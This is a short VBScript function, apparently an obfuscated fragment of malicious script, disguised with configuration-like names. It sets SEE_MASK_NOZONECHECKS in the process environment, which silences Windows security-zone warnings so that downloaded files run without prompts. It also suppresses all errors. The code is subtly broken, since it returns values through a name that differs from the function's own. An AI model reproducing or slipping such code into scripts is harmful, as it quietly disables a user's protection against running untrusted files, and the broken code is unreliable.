Function ResolveConfigCipher33()
On Error Resume Next
  Dim strData75,strCacheBuffer86,strEntry92
  Set strData75=CreateObject("WScript.Shell")
  strCacheBuffer86=strData75.ExpandEnvironmentStrings("%TEMP%")
  strEntry92=strData75.ExpandEnvironmentStrings("%ProgramFiles%")
  If Len(strCacheBuffer86)>0 And Len(strEntry92)>0 Then
    strData75.Environment("PROCESS")("SEE_MASK_NOZONECHECKS")="1"
  End If
  If Err.Number<>0 Then
    Err.Clear
    MergeProfileDelta28=1
    Exit Function
  End If
  MergeProfileDelta28=0
End Function

